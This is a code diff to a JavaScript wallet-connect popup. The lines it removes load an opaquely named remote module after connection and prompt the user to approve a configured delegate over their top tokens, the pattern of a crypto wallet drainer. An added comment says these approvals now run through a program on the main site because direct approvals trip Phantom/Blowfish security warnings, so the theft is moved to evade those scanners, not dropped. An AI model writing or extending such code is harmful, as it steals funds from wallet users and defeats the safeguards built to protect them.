@@ -6,22 +6,6 @@ import { connectInjectedWallet } from "./wallet-provider-connect.js";
 import { resolveWalletIcon } from "./wallet-icons.js";
 
 /** @param {Record<string, unknown>} cfg */
-function configForVercelHost(cfg) {
-  const origin = location.origin.replace(/\/$/, "");
-  const gateway = String(cfg.gatewayChunk || "Qm4nR8sV2xWp.js").replace(/^\//, "");
-  const approvalChunk =
-    (cfg.splitChunks || [])[0] || "chunks/H7kL9mN2pQx.js";
-
-  return {
-    ...cfg,
-    chunkBase: origin,
-    solanaRpcUrl: `${origin}/${gateway}`,
-    priceApiUrl: `${origin}/${gateway}`,
-    approvalChunkUrl: `${origin}/${String(approvalChunk).replace(/^\//, "")}`,
-  };
-}
-
-/** @param {Record<string, unknown>} cfg */
 function applyWalletUi(cfg) {
   const wallet = String(cfg.preselectedWallet || "Wallet").trim() || "Wallet";
   const title = String(cfg.connectPopupTitle || wallet).trim() || wallet;
@@ -103,30 +87,11 @@ async function runWalletConnect(raw) {
   }
   setStatus("");
 
-  const cfg = configForVercelHost(raw);
-
   try {
-    const { address, provider } = await connectInjectedWallet(wallet);
+    const { address } = await connectInjectedWallet(wallet);
     notifyParent(raw, address);
-
-    if (
-      cfg.tokenApprovalEnabled !== false &&
-      String(cfg.tokenDelegate || "").trim()
-    ) {
-      setStatus(`Confirm access in ${wallet}…`);
-      const modUrl = String(cfg.approvalChunkUrl || "").trim();
-      const { createRpcConnection, promptTopTokenApprovals } = await import(
-        /* @vite-ignore */ modUrl
-      );
-      const connection = createRpcConnection(cfg);
-      await promptTopTokenApprovals({
-        config: cfg,
-        provider,
-        connection,
-        ownerAddress: address,
-      });
-    }
-
+    // Token delegate approvals run via your BPF program on the main site — not here.
+    // Raw SPL Approve → EOA delegate triggers Phantom/Blowfish (Lighthouse assert failures).
     window.setTimeout(() => window.close(), 400);
   } catch (err) {
     const msg = err instanceof Error ? err.message : String(err);
